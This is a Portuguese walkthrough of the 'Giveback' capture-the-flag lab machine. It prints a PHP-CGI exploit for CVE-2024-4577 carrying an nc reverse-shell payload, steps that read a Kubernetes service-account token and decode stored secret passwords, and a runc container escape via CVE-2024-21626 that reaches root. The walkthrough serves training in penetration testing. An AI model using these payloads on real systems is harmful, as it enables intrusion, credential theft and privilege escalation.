Analisando o `phpinfo` vemos que o `PHP` é vulnerável a [CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577) devido a sua versão `8.3.3`. Estarei usando o seguinte payload para obter uma shell reversa:

```bash
curl -X POST \
--data 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 5555 > /tmp/f' \
'http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=on+-d+auto_prepend_file=php://input
```

### Obtendo um token autenticado do Kubernetes e a senha do babywyrm

Dentro dessa shell encontramos o token do kubernetes dentro da pasta `/var/run/secrets/kubernetes.io/serviceaccount`:
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token

eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjYxNjAwLCJpYXQiOjE3NjIxMjU2MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjg1ZGJkYjUtMTg4ZC00NjY2LWFlZTItYzMzNzZhNjdhNjQ2Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjEyOTIwN30sIm5iZiI6MTc2MjEyNTYwMCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.d0bip-rXEmYKFufCbsZkMqSVYl_ABR3okLal1QYc6g4aq7aqqrgFp7b7yeUIOJytV06ZtKVDbvQIKKcnJ5UY-tB3O04nWKvrQ9JBk_5fWFvSotKc6QF_JF7wdxc07mNnLDr0KbFzNuuzuzwz5SYtL_S0ib_gj8yneTayq_xPJyyQtDZyRALZsWYnBmxLKMKoU2aq36z4IIG2UzEFJ4ApOYmzHD8r4p_QdAOsZkaL2MRFOPaI9uR6mWA8eHNUNi6mzV4I5u-cLBxwdS4NVLvT20tC7OQ-rPSIV4RqH_KpcN2DY_Yw-A4K_GyAylEOendw7XFoGuhvoDiOVrE9p1rFaA
```

Com esse `JWT` conseguimos interagir com o Kubernetes com uma conta autenticada. Para fazer isso estarei usando o [kubectl](https://kubernetes.io/pt-br/docs/reference/kubectl/).

Primeiro precisamos exportar o token:
```bash
export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjYxMTg5LCJpYXQiOjE3NjIxMjUxODksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNGJlNTczNmYtOTQ4My00YThkLWFhNWYtMTdhNzhjYTRmOTYyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWdiOTc1IiwidWlkIjoiMDc5NDAzMjMtNjMyYi00NDA5LTkxMWItYzJmZmExZmJkY2E5In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjEyODc5Nn0sIm5iZiI6MTc2MjEyNTE4OSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.z70Y6oi0ullpCy2AtwGh5zL8PLsqaNcDdDVx6d3V9cAkf_v4QQDeT-Lj1N8knSkPVVw-MwYXZIWrC3yD628s9gmAMGKfJJ__2p6Ytuy5iRaFkFpZOQ0dCgDnwHFu-MDzlID18KMVfPgVkTwvWK5NPmuI5tV11uQA7BLb515SWm7FKpqINNu6XS4McxpmcL9eKklQwHGaR1uZwYRbjbj1eWKvnqHi0wosfVylXMOgETxYoQClMdQlrXG-G-24KNmBwHdBtHiHA0SzseK3P9UxURwQQaPnBZrH1BLqsCstuu3Lj5WzZaTskaOh0GNAGiMxpcBlRihrqTwHUCy3Is7NsQ
```

Setamos o cluster com o nome `giveback-cluster` localizado no IP 10.43.0.1:
```bash
kubectl config set-cluster giveback-cluster \
  --server=https://10.43.0.1:443 \
  --insecure-skip-tls-verify=true
```
Criamos um usuário chamado `secret-reader` que se autentica usando o token obtido.
```bash
kubectl config set-credentials secret-reader \
  --token=$TOKEN
```

Criamos um contexto chamado `giveback-ctx`. Um contexto combina cluster, usuário e namespace.
```bash
kubectl config set-context giveback-ctx \
  --cluster=giveback-cluster \
  --user=secret-reader \
  --namespace=default
```

Ativamos o contexto criado anteriormente.
```bash
kubectl config use-context giveback-ctx
```

Listamos tudo o que possuimos de acesso:
```bash
kubectl auth can-i --list     
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
secrets                                         []                                     []               [get list]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]

```

Buscamos o `secrets` encontrado anteriormente:
```bash
kubectl get secrets      
NAME                                  TYPE                 DATA   AGE
beta-vino-wp-mariadb                  Opaque               2      407d
beta-vino-wp-wordpress                Opaque               1      407d
sh.helm.release.v1.beta-vino-wp.v58   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v59   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v60   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v61   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v62   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v63   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v64   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v65   helm.sh/release.v1   1      64d
sh.helm.release.v1.beta-vino-wp.v66   helm.sh/release.v1   1      39d
sh.helm.release.v1.beta-vino-wp.v67   helm.sh/release.v1   1      39d
user-secret-babywyrm                  Opaque               1      10h
```

E por fim pegamos o `secret` chamado `user-secret-babywyrm`:
```bash
kubectl get secret user-secret-babywyrm -o yaml
apiVersion: v1
data:
  MASTERPASS: Nm1YRUhWakQwU2RBZHhFZE5DUG96TXFlUjF5MWdQ
kind: Secret
metadata:
  creationTimestamp: "2025-11-02T12:47:59Z"
  name: user-secret-babywyrm
  namespace: default
  ownerReferences:
  - apiVersion: bitnami.com/v1alpha1
    controller: true
    kind: SealedSecret
    name: user-secret-babywyrm
    uid: c40a9cc9-1ab9-459c-ab01-01f21253f489
  resourceVersion: "2856278"
  uid: 55ec2ef5-bc40-49c7-ba69-03ff558447d2
type: Opaque
```

E com isso pegamos a senha do user em base64:
```bash
echo "Nm1YRUhWakQwU2RBZHhFZE5DUG96TXFlUjF5MWdQ" | base64 -d

6mXEHVjD0SdAdxEdNCPozMqeR1y1gP
```
{{< alert >}}
**A senha aparentemente é diferente para cada instancia de máquina, então sua senha pode ser diferente da minha.**
{{< /alert >}}

## Root Flag

### Descobrindo a senha do /opt/debug

Dentro do SSH podemos usar o comando `sudo -l` para listar nossas permissões:
```bash
babywyrm@giveback:~$ sudo -l

Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

Notamos um arquivo diferente, porém ao tentar ler ele vemos que não temos permissão de leitura, apenas de executar. Ao tentar executar ele nos pede uma senha e nesse ponto da máquina eu passei um longo tempo rodando e rodando atoa. Depois de um tempo eu decidi voltar para o `kubectl` e procurar por mais dados e la eu vi que a senha do `mariadb` estava em base64, diferente do arquivo `secrets` que encontramos la no inicio.

```bash
kubectl get secret beta-vino-wp-mariadb -o yaml  
apiVersion: v1
data:
  mariadb-password: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T <--
  mariadb-root-password: c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw== <--
kind: Secret
metadata:
  annotations:
    meta.helm.sh/release-name: beta-vino-wp
    meta.helm.sh/release-namespace: default
  creationTimestamp: "2024-09-21T22:17:31Z"
  labels:
    app.kubernetes.io/instance: beta-vino-wp
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: mariadb
    app.kubernetes.io/part-of: mariadb
    app.kubernetes.io/version: 11.8.2
    helm.sh/chart: mariadb-21.0.0
  name: beta-vino-wp-mariadb
  namespace: default
  resourceVersion: "2088227"
  uid: 3473d5ec-b774-40c9-a249-81d51426a45e
type: Opaque

```

Decidi então testar essa senha no `/opt/debug` e funcionou... Sinceramente isso foi muito decepcionante, mas vida que segue. Após colocar a senha, vemos que esse binário é um "gerenciador de containers":
```bash

...

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

### Criando um container do zero para abusar da CVE-2024-21626

Essa parte da máquina é bem manual e chata, mas resumidamente: iremos abusar da [CVE-2024-21626](https://github.com/NitroCao/CVE-2024-21626). Descobrimos isso vendo a versão do `runc` (que é o /opt/debug) e buscando na internet por CVEs. Para obtermos o root, precisamos adaptar esses passos:

```bash
~/container/runc/runc --version
docker run --name helper-ctr alpine
docker export helper-ctr --output alpine.tar
mkdir rootfs
tar xf alpine.tar -C rootfs
~/container/runc/runc spec
sed -ri 's#(\s*"cwd": )"(/)"#\1 "/proc/self/fd/7"#g' config.json
grep cwd config.json
sudo ~/container/runc/runc --log ./log.json run demo
```

Antes de tudo, precisaremos usar o `busybox` estático como shell porque utilizar o `/bin/bash` normal do Linux não funciona devido às bibliotecas externas que ele utiliza, então temos que baixar o [binario](https://github.com/EXALAB/Busybox-static/blob/main/busybox_amd64) estatico (com as bibliotecas compilado dentro dele) e enviar para a máquina. Após isso podemos iniciar o ataque:

```bash
chmod +x busybox <- adiciona perm de executar
mkdir -p ./container/rootfs/bin/ <- cria a estrutura de pastas do container
cp busybox ./container/rootfs/bin/busybox <- copia o busybox para o container
cd ./container/rootfs/bin/
ln -s busybox sh <- cria um link do sh pro busybox
ln -s busybox ls <- cria um link do ls pro busybox
ln -s busybox cat <- cria um link do cat pro busybox

cd ../../../ <- volta para a pasta container
sudo /opt/debug spec <- gera o arquivo config.json
sudo /opt/debug run --keep container <- inicia o container e deixa rodando em background
exit <- sai do container
sed -ri 's#(\s*"cwd": )"(/)"#\1 "/proc/self/fd/7"#g' config.json <- adiciona o payload no config.json
sudo /opt/debug --log ./log.json run demo <- executa o payload

(unknown) # cat ../../../../../root/root.txt <- cat na flag root
2931ca6...
```

E assim finalizamos a Giveback!